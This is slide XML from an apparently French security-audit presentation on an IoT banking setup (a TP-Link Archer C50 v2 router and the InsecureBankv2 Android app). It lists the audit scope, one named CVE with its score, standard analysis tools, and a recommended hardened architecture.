          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1216152" y="184708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TP-Link Archer C50 v2</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="900" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2907792" y="184708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non officiel — 12 MB</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="850" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Shape 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="2249424"/>
            <a:ext cx="640080" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1C3A68"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="1C3A68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7" name="Text 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="22494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</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="750" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1216152" y="226771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CVE-2025-15517</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="900" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Text 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2907792" y="226771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Upload RCE — CVSS 8.6</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="850" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Shape 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="2670048"/>
            <a:ext cx="640080" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1C3A68"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="1C3A68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1" name="Text 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="26700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FW</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="750" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Text 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1216152" y="268833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tp-link.com/support/download/…</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="900" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Text 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2907792" y="268833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 C50 / v2</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="850" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Shape 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="3090672"/>
            <a:ext cx="640080" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1C3A68"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="1C3A68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5" name="Text 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="30906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APK</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="750" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Text 24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1216152" y="31089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InsecureBankv2.apk</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="900" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="Text 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2907792" y="310896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— BUILD DEBUG — 32 bits</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="850" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="Shape 26"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="3511296"/>
            <a:ext cx="640080" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1C3A68"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="1C3A68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9" name="Text 27"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="351129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fr-FR" sz="750" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="30" name="Text 28"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1216152" y="352958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com.android.insecurebankv2</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="900" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31" name="Text 29"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2907792" y="352958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2 291 classes décompilées</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="850" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32" name="Shape 30"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="3931920"/>
            <a:ext cx="640080" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1C3A68"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="1C3A68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3" name="Text 31"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="39319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fr-FR" sz="750" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="34" name="Text 32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1216152" y="395020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HTTP</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="900" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="35" name="Text 33"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2907792" y="395020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Endpoints analysés</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="850" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="36" name="Shape 34"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="4352544"/>
            <a:ext cx="640080" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1C3A68"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="1C3A68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7" name="Text 35"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="43525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fr-FR" sz="750" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="38" name="Text 36"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1216152" y="43708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avril 2026</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="900" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="40" name="Shape 38"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4663440" y="1353312"/>
            <a:ext cx="41605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/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="41" name="Text 39"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4846320" y="144475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50" b="1" noProof="0">
                <a:solidFill>
                  <a:srgbClr val="1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Méthodologie &amp; Outils</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1250" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="42" name="Shape 40"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4846320" y="1874520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43" name="Text 41"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5074920" y="183794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b="1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Binwalk</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="950" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="44" name="Text 42"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6263640" y="183794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&amp; analyse système de fichiers firmware</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="900" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="45" name="Shape 43"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4846320" y="2240280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46" name="Text 44"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5074920" y="220370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b="1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QEMU / FAT</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="950" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="47" name="Text 45"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6263640" y="220370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Émulation firmware — cartographie des services exposés</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="900" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="48" name="Shape 46"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4846320" y="2606040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49" name="Text 47"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5074920" y="256946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b="1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jadx 1.5.5</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="950" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="50" name="Text 48"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6263640" y="256946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Décompilation APK — extraction du code Java source</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="900" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="51" name="Shape 49"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4846320" y="2971800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52" name="Text 50"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5074920" y="293522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b="1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APKTool</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="950" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="53" name="Text 51"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6263640" y="293522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AndroidManifest.xml et ressources</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="900" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="54" name="Shape 52"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4846320" y="3337560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55" name="Text 53"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5074920" y="330098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b="1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</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="950" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="56" name="Text 54"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6263640" y="330098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Scan ports &amp; services sur firmware </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR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émulés</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="900" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="57" name="Shape 55"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4846320" y="3703320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58" name="Text 56"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5074920" y="366674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b="1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Burp Suite</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="950" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="59" name="Text 57"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6263640" y="366674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et manipulation des requêtes API REST</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="900" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="60" name="Shape 58"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4846320" y="4069080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61" name="Text 59"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5074920" y="403250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b="1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 v3.1</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="950" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="62" name="Text 60"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6263640" y="403250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standardisé des vulnérabilités (0–10)</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="900" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="63" name="Shape 61"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4846320" y="4434840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64" name="Text 62"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5074920" y="439826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b="1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</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="950" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="65" name="Text 63"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6263640" y="439826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 par composant IoT</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="900" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="67" name="Text 65"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="500332" y="4706141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50" noProof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: tests infrastructure cloud fictifs — backend non déployé. Analyse statique sur code source décompilé + émulation firmware.</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="850" noProof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4" name="Text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00" noProof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 |  Audit IoT Banking  |  TP-Link Archer C50 v2 &amp; InsecureBankv2  |  Avril 2026</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="700" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="54864"/>
            <a:ext cx="201168" cy="4901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6" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="137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kern="0" spc="300" noProof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ARCHITECTURE</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="900" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="38404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>
                <a:solidFill>
                  <a:srgbClr val="1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by Design — Modèle cible recommandé</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="2200" noProof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8503920" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/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9" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="10058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→ Gateway (TP-Link) → Cloud Banking — Surface d'attaque réduite</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1050" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Shape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="1353312"/>
            <a:ext cx="2743200" cy="1600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524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 noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="411480" y="14447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EDGE DEVICES</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1300" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="411480" y="1828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50" noProof="0">
                <a:solidFill>
                  <a:srgbClr val="C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 / Terminaux ATM</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="950" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Shape 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3200400" y="1353312"/>
            <a:ext cx="2743200" cy="16002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  <a:effectLst>
            <a:outerShdw blurRad="1524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 noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3291840" y="14447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GATEWAY IoT</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1300" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3291840" y="1828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50" noProof="0">
                <a:solidFill>
                  <a:srgbClr val="C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TP-Link Archer C50 v2</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="950" noProof="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR" sz="950" noProof="0">
                <a:solidFill>
                  <a:srgbClr val="C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(Hardened Firmware)</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="950" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Shape 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6080760" y="1353312"/>
            <a:ext cx="2743200" cy="16002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blurRad="1524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 noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6172200" y="14447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BANKING</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1300" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6172200" y="1828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50" noProof="0">
                <a:solidFill>
                  <a:srgbClr val="C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REST + Auth JWT</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="950" noProof="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR" sz="950" noProof="0">
                <a:solidFill>
                  <a:srgbClr val="C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sécurisée</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="950" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Text 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2971800" y="19933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000" noProof="0">
                <a:solidFill>
                  <a:srgbClr val="D4AC0D"/>
                </a:solidFill>
              </a:rPr>
              <a:t>→</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="2000" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Text 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5852160" y="19933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000" noProof="0">
                <a:solidFill>
                  <a:srgbClr val="D4AC0D"/>
                </a:solidFill>
              </a:rPr>
              <a:t>→</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="2000" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Shape 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="3090672"/>
            <a:ext cx="20574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/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Shape 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="3090672"/>
            <a:ext cx="2057400" cy="2926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3" name="Text 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="30906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5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fr-FR" sz="950" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Shape 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="448056" y="3493008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5" name="Text 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="630936" y="346557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obligatoire</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="900" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Shape 24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="448056" y="3877056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7" name="Text 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="630936" y="384962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Pinning</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="900" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="Shape 26"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="448056" y="4261104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9" name="Text 27"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="630936" y="42336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over TLS / VPN</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="900" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="30" name="Shape 28"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2532888" y="3090672"/>
            <a:ext cx="20574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/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31" name="Shape 29"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2532888" y="3090672"/>
            <a:ext cx="2057400" cy="2926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2" name="Text 30"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2532888" y="30906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5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</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="950" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="Shape 31"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2660904" y="3493008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4" name="Text 32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2843784" y="346557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expiry 15 min</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="900" noProof="0"/>
          </a:p>
